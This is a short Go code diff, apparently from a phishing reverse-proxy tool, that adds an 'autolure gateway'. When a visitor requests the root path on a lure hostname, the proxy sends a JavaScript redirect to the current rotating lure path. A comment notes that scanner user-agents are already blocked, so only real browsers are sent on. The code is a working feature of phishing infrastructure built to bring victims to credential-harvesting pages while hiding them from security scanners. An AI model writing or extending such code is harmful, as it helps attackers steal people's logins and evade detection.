@@ -536,6 +536,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     req_ok = true
                                 }
                             } else {
+                                // Autolure gateway: root request on an autolure hostname
+                                // redirects the visitor to the current active rotating path.
+                                // Scanner UAs are already blocked above so only real browsers reach here.
+                                if req_path == "/" || req_path == "" {
+                                    if al, _ := p.cfg.GetAutoLureByHostname(req.Host); al != nil {
+                                        activeURL := "https://" + req.Host + al.Path
+                                        log.Info("[autolure] [%s] gateway → %s [%s]", hiblue.Sprint(pl_name), activeURL, remote_addr)
+                                        return p.javascriptRedirect(req, activeURL)
+                                    }
+                                }
                                 log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
                                 if p.cfg.GetBlacklistMode() == "unauth" {
